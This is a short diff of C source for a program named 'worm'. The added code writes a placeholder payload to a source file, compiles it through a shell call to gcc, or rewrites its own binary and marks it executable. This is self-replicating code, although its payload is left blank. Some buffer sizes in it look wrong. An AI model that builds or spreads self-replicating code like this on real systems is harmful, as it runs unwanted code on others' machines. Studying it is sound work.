@@ -4,7 +4,6 @@
 int NUM_CHARS = 10000;
 static char target[5000] = "<insert payload here>";
 
-
 	
 char * read_source(char *filename) {
 	char *buffer =  malloc(sizeof(char) * NUM_CHARS);
@@ -57,16 +56,21 @@ int main(){
 
 	if(target[0] =='#'){
 		printf("%s\n", target);
+		FILE *op = fopen("worm2.c","w");
+		fwrite(target,sizeof(char), sizeof(char)*NUM_CHARS,op);
+		fclose(op);
+		system("gcc -w worm2.c -o worm2");
 	}else{ 
 		fiddle(source,binary);
+		FILE *op = fopen("wormy","wb");
+		fwrite(binary,sizeof(char), sizeof(binary)*NUM_CHARS,op);
+		fclose(op);
+		system("mv wormy worm; chmod +x worm");
+
 	}
 
 
-	FILE *op = fopen("wormy","wb");
-	fwrite(binary,sizeof(char), sizeof(binary)*NUM_CHARS,op);
-	fclose(op);
-	system("mv wormy worm; chmod +x worm");
-
+	
 	
 
 	free(source);
